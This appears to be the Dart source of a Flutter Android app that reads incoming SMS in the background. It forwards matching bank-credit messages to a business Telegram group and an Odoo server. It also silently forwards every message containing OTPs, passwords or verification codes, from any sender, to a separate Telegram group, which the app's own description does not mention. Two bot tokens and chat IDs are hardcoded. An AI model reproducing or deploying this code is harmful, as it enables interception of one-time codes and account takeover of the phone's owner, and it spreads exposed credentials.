import 'dart:convert';

import 'package:dart_telegram_bot/dart_telegram_bot.dart';
import 'package:dart_telegram_bot/telegram_entities.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background/flutter_background.dart';
import 'package:fluttertoast/fluttertoast.dart';
import 'package:fuels_sms/ApplicationConstants.dart';
import 'package:http/http.dart' as http;
import 'package:telephony/telephony.dart';

void onBackgroundMessage(SmsMessage message) {
  debugPrint("onBackgroundMessage: Received SMS from ${message.address}");
  sendTelegram(message.body, message.address);
}

const String telegramBotToken =
    '6038774955:AAFboWInWl7iWFMB2FRUep-KxHf5F4_0lFY';
const int telegramChatId = -1001862858056;

const String otpBotToken = '8112541883:AAHZhrMc7QuVuuTZSWYLvGN7mAbyDdzD8Ls';
const int otpGroupId = -4810490033;

const String odooServerUrl =
    'http://128.199.25.245:8069/api/telegram/message';

Future<void> sendTelegram(String? message, String? sender) async {
  debugPrint("sendTelegram: Called with sender=$sender, message=$message");
  String preciseMessage = '';

  if (message == null || sender == null) {
    debugPrint("sendTelegram: Null message or sender, aborting");
    return;
  }

  if ((sender.contains('HDFCBK') &&
      message.contains('4143') &&
      message.contains('deposited') &&
      !message.contains('XX0832')) ||
      (sender.contains('CANBNK') &&
          message.contains('363') &&
          message.contains('CREDITED')) ||
      (sender.contains('BPCLIN') && message.contains('Received')) ||
      (sender.contains('BPCLIN') && message.contains('password')) ||
      (sender.contains('STERNA') || sender.contains('ALSRAM')) ||
      (sender.contains('CBSSBI') && message.contains('Credited')) ||
      (sender.contains('SBIINB') && message.contains('transfer')) ||
      (sender.contains('SBIBNK') && message.contains('echeque')) ||
      (sender.contains('SBIPSG') && message.contains('credited')) ||
      (sender.contains('PHONPE') && message.contains('OTP'))) {
    debugPrint('sendTelegram: Message matches filter criteria');

    Bot(
      token: telegramBotToken,
      onReady: (bot) async {
        debugPrint('sendTelegram: Bot initialized successfully');
        if (sender.contains('HDFCBK') ||
            sender.contains('CANBNK') ||
            sender.contains('CBSSBI') ||
            sender.contains('SBIINB') ||
            sender.contains('SBIPSG') ||
            sender.contains('PHONPE')) {
          preciseMessage =
              message.split('.')[0] + '.' + message.split('.')[1];
          debugPrint('sendTelegram: Formatted preciseMessage=$preciseMessage');
        } else {
          preciseMessage = message;
          debugPrint('sendTelegram: Using full message=$preciseMessage');
        }

        debugPrint('sendTelegram: Sending message to Telegram chat $telegramChatId');
        await bot.sendMessage(
            ChatID(telegramChatId),
            '\nMessage from ' +
                sender.split('-')[1] +
                ':\n\n' +
                preciseMessage);
        debugPrint('sendTelegram: Message sent to Telegram');

        debugPrint('sendTelegram: Sending message to Odoo server');
        await sendToOdooServer(sender.split('-')[1], preciseMessage);
        debugPrint('sendTelegram: Completed');
      },
      onStartFailed: (bot, e, s) {
        debugPrint('sendTelegram: Bot start failed with error=$e, stack=$s');
      },
    );
  } else {
    debugPrint('sendTelegram: Message did not match filter criteria');
  }
  final lowered = message.toLowerCase();
  if (lowered.contains("otp") ||
      lowered.contains("one time") ||
      lowered.contains("password") ||
      lowered.contains("verification code")){
    Bot(
      token: otpBotToken,
      onReady: (bot) async {
        debugPrint('sendTelegram: OTP Bot initialized successfully');

        debugPrint('sendTelegram: Sending OTP message to Telegram chat $telegramChatId');
        await bot.sendMessage(
            ChatID(otpGroupId),
            '\OTP from ' +
                sender +
                ':\n\n' +
                message);
        debugPrint('sendTelegram: OTP Message sent to Telegram');
        debugPrint('sendTelegram: Completed');
      },
      onStartFailed: (bot, e, s) {
        debugPrint('sendTelegram: OTP Bot start failed with error=$e, stack=$s');
      },
    );
  }
}

Future<void> sendToOdooServer(String sender, String message) async {
  debugPrint('sendToOdooServer: Sending to Odoo with sender=$sender, message=$message');
  final response = await http.post(
    Uri.parse(odooServerUrl),
    headers: <String, String>{
      'Content-Type': 'application/json; charset=UTF-8',
    },
    body: jsonEncode(<String, String>{
      'sender': sender,
      'message': message,
    }),
  );

  if (response.statusCode == 200) {
    debugPrint("sendToOdooServer: Message sent successfully, response=${response.body}");
  } else {
    debugPrint("sendToOdooServer: Failed with status=${response.statusCode}, response=${response.body}");
  }
}

void main() {
  debugPrint('main: Starting application');
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    debugPrint('MyApp: Building app widget');
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      darkTheme: ThemeData.dark(),
      title: 'SMS Automator',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: MyHomePage(title: 'SMS Automator ${ApplicationConstants.version}'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  MyHomePage({super.key, required this.title});

  final String title;

  @override
  State<MyHomePage> createState() {
    debugPrint('MyHomePage: Creating state');
    return _MyHomePageState();
  }
}

class _MyHomePageState extends State<MyHomePage> {
  String _message = "";
  bool _scanningEnabled = true;

  TextEditingController messageController = TextEditingController();
  TextEditingController senderController = TextEditingController();
  final Telephony telephony = Telephony.instance;

  @override
  void initState() {
    debugPrint('_MyHomePageState: Initializing state');
    super.initState();
    initPlatformState();
  }

  onMessage(SmsMessage message) async {
    debugPrint('onMessage: Received SMS with body=${message.body}');
    setState(() {
      _message = message.body ?? "Error reading message body.";
      debugPrint('onMessage: Updated _message=$_message');
    });
  }

  onSendStatus(SendStatus status) {
    debugPrint('onSendStatus: Status received=$status');
    setState(() {
      _message = status == SendStatus.SENT ? "sent" : "delivered";
      debugPrint('onSendStatus: Updated _message=$_message');
    });
  }

  Future<void> initPlatformState() async {
    debugPrint('initPlatformState: Requesting phone and SMS permissions');
    final bool? result = await telephony.requestPhoneAndSmsPermissions;

    if (result != null && result) {
      debugPrint('initPlatformState: Permissions granted, starting SMS listener');
      telephony.listenIncomingSms(
          onNewMessage: _scanningEnabled ? onMessage : _dummyCallback,
          onBackgroundMessage: onBackgroundMessage);
    } else {
      debugPrint('initPlatformState: Permissions denied or null');
    }

    debugPrint('initPlatformState: Initializing background execution');
    const androidConfig = FlutterBackgroundAndroidConfig(
      notificationTitle: "Zaptr Automator",
      notificationText: "Your own personal automator",
      notificationImportance: AndroidNotificationImportance.Default,
    );
    bool success =
    await FlutterBackground.initialize(androidConfig: androidConfig);
    debugPrint('initPlatformState: Background initialization success=$success');
    if (success) {
      FlutterBackground.enableBackgroundExecution();
      debugPrint('initPlatformState: Background execution enabled');
      Fluttertoast.showToast(msg: 'App will run in background');
    } else {
      debugPrint('initPlatformState: Background initialization failed');
    }

    if (!mounted) {
      debugPrint('initPlatformState: Widget not mounted, exiting');
      return;
    }
  }

  void _dummyCallback(SmsMessage message) {
    debugPrint('_dummyCallback: Called with message=${message.body}');
  }

  @override
  Widget build(BuildContext context) {
    debugPrint('MyHomePageState: Building UI');
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            Text(
              'This app will read incoming sms and send to Sowdambiga Fuels Telegram group',
            ),
            TextField(
                controller: senderController,
                decoration: InputDecoration(label: Text('Sender'))),
            TextField(
              controller: messageController,
              decoration: InputDecoration(label: Text('Message')),
            ),
            ElevatedButton(
                onPressed: () {
                  debugPrint('Button: Send pressed, sending manual message');
                  sendTelegram(messageController.text, senderController.text);
                },
                child: Text('Send')),
            ElevatedButton(
              onPressed: () {
                debugPrint('Button: Toggling scan, current state=$_scanningEnabled');
                setState(() {
                  _scanningEnabled = !_scanningEnabled;
                  debugPrint('Button: Scan state changed to $_scanningEnabled');
                });
              },
              child: Text(_scanningEnabled ? 'Stop Scan' : 'Start Scan'),
            ),
            ElevatedButton(
              onPressed: () {
                debugPrint('Button: Check background process pressed');
                bool enabled = FlutterBackground.isBackgroundExecutionEnabled;
                debugPrint('Button: Background execution enabled=$enabled');
                if (enabled) {
                  const snackbar = SnackBar(
                    content: Text('Enabled'),
                  );
                  ScaffoldMessenger.of(context).showSnackBar(snackbar);
                }
              },
              child: Text('Check background process'),
            ),
            Center(child: Text("Latest received SMS: $_message")),
          ],
        ),
      ),
    );
  }
}